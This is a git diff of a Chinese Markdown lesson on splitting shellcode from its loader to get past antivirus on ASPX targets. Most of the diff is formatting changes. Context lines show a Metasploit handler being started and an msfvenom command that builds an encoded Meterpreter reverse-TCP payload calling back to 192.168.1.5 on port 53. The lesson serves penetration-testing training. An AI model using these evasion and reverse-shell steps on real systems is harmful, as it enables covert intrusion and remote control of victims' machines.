@@ -1,18 +1,17 @@
-# 专注APT攻击与防御
-https://micropoor.blogspot.com/
 
-**关于分离免杀，其他章节参考：**
-* 68课时payload特征，行为分离免杀思路第一季
+**关于分离免杀，其他章节参考：**  
+* 68课时payload特征，行为分离免杀思路第一季  
 * 69课时payload分离免杀思路第二季
 
 本季针对目标环境支持aspx进行分离免杀。
 
-**靶机背景：**
-* Windows 2003 
+**靶机背景：**  
+* Windows 2003   
 * Debian
 
-Windows 2003：
-![](media/9104a6f1137ab57d036f0991e729abf9.jpg)
+Windows 2003：  
+![](media/9104a6f1137ab57d036f0991e729abf9.jpg)  
+
 ![](media/2182d6d13212bb3cde601fe2599b1881.jpg)
 
 ```bash
@@ -52,10 +51,11 @@ Id Name
 0 Wildcard Target
 
 msf exploit(multi/handler) > exploit -j -z
-```
+```  
+
 ![](media/00d58943295e364f2a1f8251672be88e.jpg)
 
-**payload生成：**
+### payload生成：
 ```bash
 root@John:tmp# msfvenom -a x86 -p windows/meterpreter/reverse_tcp_uuid
 LHOST=192.168.1.5 LPORT=53 EnableStageEncoding=true
@@ -107,7 +107,7 @@ byte[] buf = new byte[509] {
 ```
 ![](media/f5006eadab8d227553b661a3f8ad93f5.jpg)
 
-**其中分离shellcode。构造如下：**
+### 其中分离shellcode。构造如下：
 ![](media/84bf0debd2184dacca2b28ce81e1b578.jpg)
 
 ![](media/80a54d326b2bd658b02c39242582164a.jpg)
@@ -116,7 +116,7 @@ byte[] buf = new byte[509] {
 
 **上线成功，关于分离免杀的思路不仅仅限制于脚本，pe文件。包括powershell等。这是每一个安全从业者应该考虑的问题。**
 
-**附录：Source code**
+### 附录：Source code
 ```c#
 <%@ Page Language="C#" AutoEventWireup="true" Inherits="System.Web.UI.Page" %>
 <%@ Import Namespace="System" %>
